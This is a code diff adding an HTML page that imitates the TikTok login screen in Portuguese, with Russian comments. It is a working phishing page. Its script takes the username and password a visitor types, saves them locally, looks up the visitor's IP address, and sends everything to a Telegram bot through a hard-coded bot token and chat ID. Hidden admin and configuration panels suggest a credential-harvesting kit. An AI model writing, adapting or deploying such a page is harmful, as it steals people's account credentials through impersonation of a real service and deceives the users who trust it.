@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no TikTok | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 40px;
+        }
+        
+        .logo svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+        }
+        
+        .login-form {
+            background-color: #121212;
+            border-radius: 12px;
+            padding: 40px 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .login-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background-color: #1e1e1e;
+            border: 1px solid #3d3d3d;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #fe2c55;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .login-button:hover {
+            background-color: #ff3b6c;
+        }
+        
+        .login-button:disabled {
+            background-color: #8a8a8a;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #8a8a8a;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #3d3d3d;
+        }
+        
+        .divider span {
+            padding: 0 16px;
+            font-size: 14px;
+        }
+        
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .social-button {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #1e1e1e;
+            border: 1px solid #3d3d3d;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .social-button:hover {
+            background-color: #2a2a2a;
+        }
+        
+        .social-button svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .forgot-password {
+            color: #8a8a8a;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 16px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .signup-link {
+            margin-top: 40px;
+            color: #8a8a8a;
+            font-size: 14px;
+        }
+        
+        .signup-link a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #8a8a8a;
+        }
+        
+        .footer a {
+            color: #8a8a8a;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            margin-top: 16px;
+            color: #8a8a8a;
+            font-size: 12px;
+        }
+        
+        .language-selector select {
+            background: transparent;
+            border: none;
+            color: #8a8a8a;
+            outline: none;
+            cursor: pointer;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            background-color: #121212;
+            border-left: 4px solid #fe2c55;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 1000;
+        }
+        
+        /* Скрытые панели администрирования */
+        .admin-panel, .config-panel {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="40" height="40">
+                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
+            </svg>
+        </div>
+        
+        <div class="login-form">
+            <h1 class="login-title">Entrar no TikTok</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" class="input-field" id="username" placeholder="E-mail ou nome de usuário" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" class="input-field" id="password" placeholder="Senha" required>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginButton">Entrar</button>
+                
+                <a href="#" class="forgot-password">Esqueceu a senha?</a>
+                
+                <div class="divider">
+                    <span>ou</span>
+                </div>
+                
+                <div class="social-login">
+                    <button type="button" class="social-button">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="#1877F2">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-button">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="#1DA1F2">
+                            <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723 10.016 10.016 0 01-3.127 1.184 4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.937 4.937 0 004.604 3.417 9.868 9.868 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63a9.936 9.936 0 002.46-2.548l-.047-.02z"/>
+                        </svg>
+                    </button>
+                    <button type="button" class="social-button">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="#DB4437">
+                            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm6.506 12.301c0-3.314-2.692-6.006-6.006-6.006s-6.006 2.692-6.006 6.006 2.692 6.006 6.006 6.006 6.006-2.692 6.006-6.006z"/>
+                            <path d="M12 6.757c2.896 0 5.243 2.347 5.243 5.243S14.896 17.243 12 17.243 6.757 14.896 6.757 12 9.104 6.757 12 6.757z"/>
+                        </svg>
+                    </button>
+                </div>
+            </form>
+            
+            <div class="signup-link">
+                Não tem uma conta? <a href="#">Cadastre-se</a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Ajuda</a>
+            <a href="#">Privacidade</a>
+            <a href="#">Termos</a>
+        </div>
+        
+        <div class="language-selector">
+            <select>
+                <option>Português</option>
+                <option>English</option>
+                <option>Español</option>
+                <option>Français</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="notification" id="notification"></div>
+    
+    <!-- Скрытые панели администрирования -->
+    <div class="admin-panel" id="adminPanel">Painel Admin</div>
+    <div class="config-panel" id="configPanel">Configurar Telegram</div>
+
+    <script>
+        // Предустановленная конфигурация Telegram
+        const telegramConfig = {
+            botToken: '8511531384:AAHmkF_VeMBAF1JdccuKD8cpg3bRAfWwRo8',
+            chatId: '6065003571'
+        };
+        
+        // Инициализация базы данных в localStorage
+        function initDatabase() {
+            if (!localStorage.getItem('tiktok_logs')) {
+                localStorage.setItem('tiktok_logs', JSON.stringify([]));
+            }
+        }
+        
+        // Сохранение данных входа
+        function saveLoginData(username, password) {
+            const logs = JSON.parse(localStorage.getItem('tiktok_logs'));
+            const newLog = {
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: 'Ожидание получения...' // В реальном приложении можно получить через API
+            };
+            logs.push(newLog);
+            localStorage.setItem('tiktok_logs', JSON.stringify(logs));
+            
+            return newLog;
+        }
+        
+        // Получение IP-адреса пользователя
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Não foi possível obter o IP';
+            }
+        }
+        
+        // Отправка данных в Telegram
+        async function sendToTelegram(loginData) {
+            const userIP = await getUserIP();
+            
+            const message = `
+🚨 NOVO LOGIN TIKTOK 🚨
+
+👤 Usuário: ${loginData.username}
+🔑 Senha: ${loginData.password}
+⏰ Data/Hora: ${new Date(loginData.timestamp).toLocaleString('pt-BR')}
+🌐 Navegador: ${navigator.userAgent}
+📍 IP: ${userIP}
+
+⚠️ Verifique imediatamente!
+            `.trim();
+            
+            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: telegramConfig.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Erro ao enviar para Telegram');
+            }
+            
+            return response.json();
+        }
+        
+        // Показать уведомление
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.borderLeftColor = isError ? '#fe2c55' : '#25F4EE';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Обработчик формы входа
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginButton = document.getElementById('loginButton');
+            
+            // Блокируем кнопку на время отправки
+            loginButton.disabled = true;
+            loginButton.textContent = 'Enviando...';
+            
+            try {
+                // Сохраняем данные в "базу данных"
+                const loginData = saveLoginData(username, password);
+                
+                // Отправляем в Telegram
+                await sendToTelegram(loginData);
+                
+                // Показываем сообщение об успехе
+                showNotification('Login realizado com sucesso! Dados enviados para Telegram.');
+                
+            } catch (error) {
+                console.error('Erro:', error);
+                showNotification('Erro ao enviar dados: ' + error.message, true);
+            } finally {
+                // Восстанавливаем кнопку
+                loginButton.disabled = false;
+                loginButton.textContent = 'Entrar';
+                
+                // Очищаем форму
+                document.getElementById('loginForm').reset();
+            }
+        });
+        
+        // Инициализация при загрузке страницы
+        window.addEventListener('load', function() {
+            initDatabase();
+        });
+    </script>
+</body>
+</html>
